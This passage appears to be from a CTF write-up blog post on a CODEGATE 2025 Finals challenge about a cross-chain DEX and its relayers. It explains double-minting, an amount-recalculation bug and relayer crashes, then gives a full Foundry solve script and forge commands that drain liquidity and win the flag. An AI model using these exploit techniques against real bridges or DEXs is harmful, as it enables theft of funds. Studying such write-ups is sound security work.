+</span></span><span style="display:flex;"><span>                    event_message <span style="color:#f92672">=</span> event_args[<span style="color:#e6db74">&#39;message&#39;</span>]
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;CODE&#39;</span> <span style="color:#66d9ef">if</span> chain_id <span style="color:#f92672">==</span> CODE_CHAIN <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;GATE&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> Chain] MessageSent: </span><span style="color:#e6db74">{</span>event_message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    print(event_message)
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> event_message[<span style="color:#e6db74">&#39;messageType&#39;</span>] <span style="color:#f92672">==</span> LiquidityRequest:
+</span></span><span style="display:flex;"><span>                        tx_hash <span style="color:#f92672">=</span> tokens[event_message[<span style="color:#e6db74">&#39;dstToken&#39;</span>]<span style="color:#f92672">.</span>hex()]<span style="color:#f92672">.</span>functions<span style="color:#f92672">.</span>mint(event_message[<span style="color:#e6db74">&#39;receiver&#39;</span>], event_message[<span style="color:#e6db74">&#39;amount&#39;</span>])<span style="color:#f92672">.</span>transact()
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">elif</span> event_message[<span style="color:#e6db74">&#39;messageType&#39;</span>] <span style="color:#f92672">==</span> LiquidityResponse:
+</span></span><span style="display:flex;"><span>                        tx_hash <span style="color:#f92672">=</span> tokens[event_message[<span style="color:#e6db74">&#39;dstToken&#39;</span>]<span style="color:#f92672">.</span>hex()]<span style="color:#f92672">.</span>functions<span style="color:#f92672">.</span>burn(event_message[<span style="color:#e6db74">&#39;from&#39;</span>], event_message[<span style="color:#e6db74">&#39;amount&#39;</span>])<span style="color:#f92672">.</span>transact()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    message_tuple <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;messageType&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;from&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;receiver&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;srcToken&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;dstToken&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;srcChainId&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;dstChainId&#39;</span>],
+</span></span><span style="display:flex;"><span>                        event_message[<span style="color:#e6db74">&#39;amount&#39;</span>],
+</span></span><span style="display:flex;"><span>                    )
+</span></span><span style="display:flex;"><span>                    tx_hash <span style="color:#f92672">=</span> dst_contract<span style="color:#f92672">.</span>functions<span style="color:#f92672">.</span>handleMessage(message_tuple)<span style="color:#f92672">.</span>transact()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> asyncio<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span></code></pre></div><p>Note that there are two relayers, one for relaying messages from CODE chain to GATE chain, and another for relaying GATE chain to CODE chain.</p>
+<p>To illustrate this, let&rsquo;s take a look at a diagram of what happens during a cross chain swap of GATE chain to CODE chain. Hopefully this will make things more clear.</p>
+
+  <img src="./img/cross-swap.png"  class="center"  style="border-radius: 5px; width: 100%"  />
+
+
+<h4 id="cross-chain-liquidity-handling">Cross-chain liquidity handling<a href="#cross-chain-liquidity-handling" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Now, let&rsquo;s consider the scenario where one DEX has insufficient liquidity, for example, swapping 130 USDC for 650 PURR when the DEX only has 600 PURR - what happens then?</p>
+<p>If we look at the <code>_swap()</code> code, we see that there is logic to handle this case, when the target token amount is more than the DEX&rsquo;s balance of the destination token.</p>
+<p>When this is the case:</p>
+<ul>
+<li>the difference in tokens is calculated and used as the amount in the <code>LiquidityRequest</code> cross chain message</li>
+<li>the target amount is changed to the DEX&rsquo;s token balance, essentially transferring the DEX&rsquo;s entire token balance to the receiver</li>
+<li><code>amount</code> is recalculated to be based on the new target amount</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_swap</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">from</span>, <span style="color:#66d9ef">address</span> receiver, <span style="color:#66d9ef">uint256</span> amount, <span style="color:#66d9ef">bytes32</span> srcToken, <span style="color:#66d9ef">bytes32</span> dstToken) <span style="color:#66d9ef">internal</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint256</span> rate <span style="color:#f92672">=</span> _getRate(srcToken, dstToken);
+</span></span><span style="display:flex;"><span>        Token srcTokenAddress <span style="color:#f92672">=</span> Token(tokenMapping[srcToken]);
+</span></span><span style="display:flex;"><span>        Token dstTokenAddress <span style="color:#f92672">=</span> Token(tokenMapping[dstToken]);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint256</span> targetAmount <span style="color:#f92672">=</span> amount <span style="color:#f92672">*</span> rate <span style="color:#f92672">/</span> <span style="color:#ae81ff">1</span>e6;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint256</span> diffAmount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(dstTokenAddress.balanceOf(<span style="color:#66d9ef">address</span>(this)) <span style="color:#f92672">&lt;</span> targetAmount) {
+</span></span><span style="display:flex;"><span>            diffAmount <span style="color:#f92672">=</span> targetAmount <span style="color:#f92672">-</span> dstTokenAddress.balanceOf(<span style="color:#66d9ef">address</span>(this));
+</span></span><span style="display:flex;"><span>            targetAmount <span style="color:#f92672">=</span> dstTokenAddress.balanceOf(<span style="color:#66d9ef">address</span>(this));
+</span></span><span style="display:flex;"><span>            amount <span style="color:#f92672">=</span> _getRate(dstToken, srcToken) <span style="color:#f92672">*</span> targetAmount <span style="color:#f92672">/</span> <span style="color:#ae81ff">1</span>e6;
+</span></span><span style="display:flex;"><span>            emit MessageSent(Message({
+</span></span><span style="display:flex;"><span>                messageType<span style="color:#f92672">:</span> MessageType.LiquidityRequest,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">from</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">address</span>(this),
+</span></span><span style="display:flex;"><span>                receiver<span style="color:#f92672">:</span> receiver,
+</span></span><span style="display:flex;"><span>                srcToken<span style="color:#f92672">:</span> srcToken,
+</span></span><span style="display:flex;"><span>                dstToken<span style="color:#f92672">:</span> dstToken,
+</span></span><span style="display:flex;"><span>                srcChainId<span style="color:#f92672">:</span> block.chainid,
+</span></span><span style="display:flex;"><span>                dstChainId<span style="color:#f92672">:</span> block.chainid <span style="color:#f92672">==</span> CODE_CHAIN <span style="color:#f92672">?</span> GATE_CHAIN <span style="color:#f92672">:</span> CODE_CHAIN,
+</span></span><span style="display:flex;"><span>                amount<span style="color:#f92672">:</span> diffAmount
+</span></span><span style="display:flex;"><span>            }));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">from</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">address</span>(this)) {
+</span></span><span style="display:flex;"><span>            srcTokenAddress.transferFrom(<span style="color:#66d9ef">from</span>, <span style="color:#66d9ef">address</span>(this), amount);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        dstTokenAddress.transfer(receiver, targetAmount);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Let&rsquo;s look into what the <code>LiquidityRequest</code> cross-chain message is for. Checking the relayer code, we see that upon receiving <code>LiquidityRequest</code> event, the relayer will <code>mint</code> the amount of specified tokens, in this case, the difference in the target output token amount and the DEX&rsquo;s token balance.</p>
+<p>The relayer then forwards this event to the other chain through calling <code>handleMessage</code>, which handles it by emitting <code>LiquidityResponse</code>. When the other relayer receives <code>LiquidityResponse</code>, it will burn the specified amount of tokens.</p>
+<p>Essentially, the relayers will mint the receiver the missing tokens on the current, and burn that amount of tokens on the other chain.</p>
+<p>The process is a bit confusing, so here&rsquo;s another diagram to illustrate:</p>
+
+  <img src="./img/swap-liquidity-request.png"  class="center"  style="border-radius: 5px; width: 100%"  />
+
+
+<p>The numbers represent the block number order that the actions are performed in.</p>
+<h4 id="bugs---double-minting-and-business-logic-errors">Bugs - Double minting and business logic errors<a href="#bugs---double-minting-and-business-logic-errors" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>You might already see the potential for some critical vulnerabilities - there is a delay between the <code>mint</code> and <code>burn</code> calls, allowing for a brief window where tokens are minted on the source chain, but are not yet destroyed on the destination chain.</p>
+<p>Additionally, there is no check to see if the destination chain even contains enough liquidity - what happens in the above example if DEX on CODE chain contains less than 50 PURR?</p>
+<p>As you might expect, the <code>burn(DEX, 50)</code> call will revert as the DEX does not have 50 tokens, and because the call reverted, the relayer would crash. Upon the relayer crashing, it does not start up again - the cross chain messaging breaks. What was more surprising was that <strong>both</strong> relayers would crash, not just the relayer whose call reverted.</p>
+<p>There is also a bug in the <code>_swap</code> function - for some reason, in the insufficient liquidity case, the amount of source tokens transferred from the user is recalculated based on the DEX&rsquo;s current destination token balance.</p>
+<p>In the example in the diagram, when 130 USDC was swapped for 650 PURR and the DEX had 600 PURR, only $\frac{0.2}{1} \times 600 = 120$ USDC tokens were actually transferred from the user instead of $130$. This recalculation shouldn&rsquo;t have happened at all, since we now own more than we put in, with 600 PURR transferred to us immediantly, then another 50 PURR minted via the relayer, all for the price of 120 USDC instead of 130 USDC.</p>
+<h4 id="exploitation---implementing-the-attack">Exploitation - implementing the attack<a href="#exploitation---implementing-the-attack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Ok, we now have a bunch of bugs to exploit, but it turns out that actually implementing the exploits was kinda tricky.</p>
+<p>Recall that we start with 100 USDC, 100 PURR, 100 MOODENG, and both DEXs on each chain starts with 600 USDC, 600 PURR, 600 MOODENG.</p>
+<p>Also recall the exchange rates:</p>
+<ul>
+<li>1 USDC = 1 USDC</li>
+<li>1 PURR = 0.2 USDC</li>
+<li>1 MOODENG = 0.19 USDC</li>
+</ul>
+<p>To trigger the bugs, we need to perform a swap such that the DEX has insufficient destination tokens to fulfill our trade.</p>
+<p>We barely have enough tokens for this to work:</p>
+<ul>
+<li>Swap 100 PURR -&gt; 20 USDC</li>
+<li>Swap 100 MOODENG -&gt; 19 USDC</li>
+<li>Swap 139 USDC -&gt; 695 PURR</li>
+</ul>
+<p>with all swaps done on the GATE chain (where we initially have tokens).</p>
+<p>As 695 &gt; 600, it seems like this will trigger the bugs, but remember we actually swapped 100 PURR for 20 USDC, therefore the DEX now has 700 PURR instead of 600, so it has sufficient liquidity for our swap.</p>
+<p>We can work around this by doing the last swap of 139 USDC -&gt; 695 PURR on the CODE chain by first bridging over the USDC then swapping. Since the CODE chain has 600 PURR, this is insufficient liquidity and will trigger the bug.</p>
+<p>Note that because of the amount recalculation bug discussed previously, the swap of 139 USDC -&gt; 695 PURR is actually 120 USDC -&gt; 600 + 95 PURR.</p>
+<p>Below is a diagram that illustrates these swaps:</p>
+
+  <img src="./img/swaps.png"  class="center"  style="border-radius: 5px; width: 100%"  />
+
+
+<p>But let&rsquo;s take a moment to consider exploiting the other bugs we found - the lack of checks of sufficient liquidity on the other chain. For example, if there is 100 PURR on the GATE chain, and we have 200 PURR, swapping PURR for PURR will result in double-minting, as we only spend 100 PURR and receive 100 PURR back, but also get minted another 100 PURR by the relayer, now having 300 PURR.</p>
+<p>However, we can&rsquo;t repeat this process for larger amounts without crashing the relayer - the swap will burn the same amount of tokens we are minted on the opposite chain - if that chain doesn&rsquo;t have sufficient liquidity, the burn call reverts and <strong>relayers for both chains crash</strong>.</p>
+<p>Relayers crashing was especially annoying when I first tried this exploit, I could for example mint 1,000,000 MOODENG on CODE chain, but this would crash the relayers, and since there is insufficient USDC and PURR on the CODE chain DEX, I couldn&rsquo;t solve the challenge this way - we have to use some method of moving and gaining tokens on one chain without crashing the relayer in the process.</p>
+<h4 id="solving-the-challenge">Solving the challenge<a href="#solving-the-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Actually implementing the solve scripts for this challenge was a pain, since for whatever reason, <a href="https://github.com/foundry-rs/foundry/issues/6825">Foundry&rsquo;s <code>--skip-simulation</code> doesn&rsquo;t work</a>. Since there was cross chain components involved, this meant that we had to run several parts of the solve script manually. For example, if we bridged USDC from GATE to CODE chain, then tried to swap our USDC on CODE chain, Foundry&rsquo;s simulation of the script wouldn&rsquo;t pass since it doesn&rsquo;t simulation the off-chain relayer and thinks we have no tokens on CODE chain, therefore we had to seperate these parts.</p>
+<p>Steps to solve the challenge:</p>
+<ul>
+<li>do the aforementioned swaps to move liquidity from GATE chain to CODE chain. We repeatedly swap USDC for PURR, then PURR to USDC, to move PURR tokens from the GATE chain to the CODE chain. Due to the amount recalculation bug, we can increase our swap amount by 19 USDC with each swap.</li>
+<li>once sufficient (&gt;1200) PURR tokens are moved, we perform a similar process for the MOODENG tokens, but this time only 1 swap is required, as we already have enough USDC to buy 1200 MOODENG tokens. We thus receive 600 MOODENG from CODE DEX, and another 600 from GATE DEX</li>
+<li>finally, with all the liquidity moved to the CODE chain, we can use our double-minting bug to gain large amounts of USDC tokens, then use the USDC tokens to swap for PURR and MOODENG. The relayer crashes, but it doesn&rsquo;t matter anymore at this point, since all the liquidity is moved to CODE chain and we don&rsquo;t need to perform further cross-chain actions.</li>
+</ul>
+<p>Solve script:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1337" type="checkbox" checked />
+    <label for="1337">
+      <span class="collapsable-code__language">solidity</span>
+      <span class="collapsable-code__title">solve_script.s.sol</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-solidity" ><code>
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Script, console} from &#34;forge-std/Script.sol&#34;;
+import {Counter} from &#34;../src/Counter.sol&#34;;
+import &#34;../src/Setup.sol&#34;;
+import &#34;../src/FaucetLogic.sol&#34;;
+import &#34;../src/Token.sol&#34;;
+import &#34;../src/DEX.sol&#34;;
+
+contract Solve is Script {
+    bytes32 USDC = keccak256(abi.encodePacked(&#34;USDC&#34;));
+    bytes32 PURR = keccak256(abi.encodePacked(&#34;PURR&#34;));
+    bytes32 MOO = keccak256(abi.encodePacked(&#34;MOODENG&#34;));
+    Token tokenA_gate;
+    Token tokenB_gate;
+    Token tokenC_gate;
+    Token tokenA_code;
+    Token tokenB_code;
+    Token tokenC_code;
+    DEX dex_gate;
+    DEX dex_code;
+    uint privkey;
+    address myAddr;
+    FaucetLogic faucet;
+    Setup setup;
+
+    function setUp() public {
+        privkey = vm.envUint(&#34;PRIVKEY&#34;);
+        myAddr = vm.addr(privkey);
+        
+        vm.createSelectFork(vm.envString(&#34;RPCURL_GATE&#34;));
+
+        setup = Setup(address(vm.envAddress(&#34;SETUP&#34;)));
+        faucet = FaucetLogic(setup.faucet());
+        
+        tokenA_gate = Token(setup.tokenA());
+        tokenB_gate = Token(setup.tokenB());
+        tokenC_gate = Token(setup.tokenC());
+        dex_gate = DEX(setup.dex());
+
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+
+        tokenA_code = Token(setup.tokenA());
+        tokenB_code = Token(setup.tokenB());
+        tokenC_code = Token(setup.tokenC());
+        dex_code = DEX(setup.dex());
+    }
+
+    function run() public {
+        // claim tokens and approve
+        vm.createSelectFork(vm.envString(&#34;RPCURL_GATE&#34;));
+        vm.startBroadcast(privkey);
+
+        faucet.claimToken(address(tokenA_gate));
+        faucet.claimToken(address(tokenB_gate));
+        faucet.claimToken(address(tokenC_gate));
+
+        tokenA_gate.approve(address(dex_gate), type(uint).max);
+        tokenB_gate.approve(address(dex_gate), type(uint).max);
+        tokenC_gate.approve(address(dex_gate), type(uint).max);
+
+        // swap all tokens to USDC and bridge to CODE chain
+        logBalances_gate();
+
+        console.log(&#34;swapping all for USDC and bridging&#34;);
+        dex_gate.swap(myAddr, PURR, USDC, 100 ether, false);
+        dex_gate.swap(myAddr, MOO, USDC, 100 ether, false);
+        dex_gate.swap(myAddr, USDC, USDC, 139 ether, true);
+
+        logBalances_gate();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_0() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        // approve
+        tokenA_code.approve(address(dex_code), type(uint).max);
+        tokenB_code.approve(address(dex_code), type(uint).max);
+        tokenC_code.approve(address(dex_code), type(uint).max);
+        
+        // swap USDC for PURR
+        // and back
+        // draining GATE DEX liquidity
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 0;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_1() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        // swap USDC for PURR
+        // and back
+        // draining GATE DEX liquidity
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 0;
+        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
+        amount &#43;= 19;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_2() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 1;
+        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
+        amount &#43;= 19;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_3() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 2;
+        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
+        amount &#43;= 19;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_4() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 3;
+        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
+        amount &#43;= 19;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_5() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 4;
+        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
+        amount &#43;= 19;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_usdc_purr_6() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+
+        logBalances_code();
+
+        uint amount = 139 &#43; 19 * 5;
+        dex_code.swap(myAddr, PURR, USDC, amount * 5 ether, false);
+        amount &#43;= 19;
+        dex_code.swap(myAddr, USDC, PURR, amount * 1 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_swap_moo_0() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+        
+        logBalances_code();
+
+        // move MOO liquidity from GATE to CODE chain
+        dex_code.swap(myAddr, PURR, USDC, 1200 ether, false);
+        dex_code.swap(myAddr, USDC, MOO, 229 ether, false);
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+    
+    function code_final_solve_0() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+        
+        logBalances_code();
+
+        // get more USDC than DEX has
+        dex_code.swap(myAddr, MOO, USDC, 1200 ether, false);
+
+        // abuse double-mint to get large amount of USDC
+        // on CODE chain.
+        // this crashes relayer but doesnt matter anymore
+        // since all required liquidity is moved to CODE chain
+        for (int i=0; i&lt;20; i&#43;&#43;) {
+            dex_code.swap(myAddr, USDC, USDC, 350 ether, false);
+        }
+
+        logBalances_code();
+
+        vm.stopBroadcast();
+    }
+
+    function code_final_solve_1() public {
+        vm.createSelectFork(vm.envString(&#34;RPCURL_CODE&#34;));
+        vm.startBroadcast(privkey);
+        
+        logBalances_code();
+
+        // swap USDC for required MOO and PURR
+        // and solve challenge
+        dex_code.swap(myAddr, USDC, PURR, 300 ether, false);
+        dex_code.swap(myAddr, USDC, MOO, 300 ether, false);
+
+        logBalances_code();
+
+        setup.solve();
+
+        vm.stopBroadcast();
+    }
+
+    function logBalances_gate() public {
+        console.log(&#34;\nmy&#34;);
+        console.log(&#34;USDC my bal:&#34;, tokenA_gate.balanceOf(address(myAddr)));
+        console.log(&#34;PURR my bal:&#34;, tokenB_gate.balanceOf(address(myAddr)));
+        console.log(&#34;MOO my bal:&#34;, tokenC_gate.balanceOf(address(myAddr)));
+        console.log(&#34;\ndex&#34;);
+        console.log(&#34;USDC DEX bal:&#34;, tokenA_gate.balanceOf(address(dex_gate)));
+        console.log(&#34;PURR DEX bal:&#34;, tokenB_gate.balanceOf(address(dex_gate)));
+        console.log(&#34;MOO DEX bal:&#34;, tokenC_gate.balanceOf(address(dex_gate)));
+    }
+
+    function logBalances_code() public {
+        console.log(&#34;\nmy&#34;);
+        console.log(&#34;USDC my bal:&#34;, tokenA_code.balanceOf(address(myAddr)));
+        console.log(&#34;PURR my bal:&#34;, tokenB_code.balanceOf(address(myAddr)));
+        console.log(&#34;MOO my bal:&#34;, tokenC_code.balanceOf(address(myAddr)));
+        console.log(&#34;\ndex&#34;);
+        console.log(&#34;USDC DEX bal:&#34;, tokenA_code.balanceOf(address(dex_code)));
+        console.log(&#34;PURR DEX bal:&#34;, tokenB_code.balanceOf(address(dex_code)));
+        console.log(&#34;MOO DEX bal:&#34;, tokenC_code.balanceOf(address(dex_code)));
+    }
+}
+
+
+</code></pre>
+  </div>
+
+
+<p>Running the solve script is split into several parts due to the cross chain component. Note that this is done after setting code for the faucet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>forge script Solve --sig run --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_0 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_1 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_2 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_3 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_4 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_5 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_usdc_purr_6 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_swap_moo_0 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_final_solve_0 --broadcast <span style="color:#f92672">&amp;&amp;</span> sleep <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>forge script Solve --sig code_final_solve_1 --broadcast
+</span></span></code></pre></div>
+  <img src="./img/solve.png"  class="center"  style="border-radius: 5px; width: 80%"  />
+
+
+<p>Get flag <code>codegate2025{f166ec27fa5efeac43470f8ab0f662effc56666a62d64998eafdca85a5fe3b54}</code></p>
+<p>And blood the challenge!!</p>
+
+  <img src="./img/blood.png"  class="center"  style="border-radius: 5px; width: 70%"  />
+
+
+<p>Thanks to <code>snwo</code> for authoring this challenge!</p>
+<h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>CODEGATE 2025 Finals CTF was a lot of fun - it was great meeting people from other teams! I also  participated in CODEGATE last year in the Junior division (and also came 7th lol), and it was a good experience, so I am glad I could attend once again!</p>
+<p>It was also my first time pulling an all nighter for the CTF - since it was 24 hours ranging from 10am to 10am the next day, a lot of teams also stayed the entire time.</p>
+<p>I would like to thank organisers and challenge authors for the CTF, and my team for their tremendous effort in the CTF, and I hope to attend again next year!</p>
+<p>As always, if you spotted any errors/typos in the blog, or have questions, feel free to DM/ping me on discord <code>thesavageteddy</code>.</p>
+<p>Btw, props to organisers for putting our team name emojis 🤬🇫🇷🛹🐻 onto both the badge and banner lol.</p>
+
+  <img src="./img/badge.jpg"  class="center"  style="border-radius: 5px; width: 30%"  />
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://TheSavageTeddy.github.io/featured/bsides-canberra-ctf-2024/">
+                <span class="button__text">Crypto Writeups - BSides Canberra CTF 2024</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+    </div>
+
+    
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>teddyctf</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+    
+  </div>
+
+</body>
+
+</html>
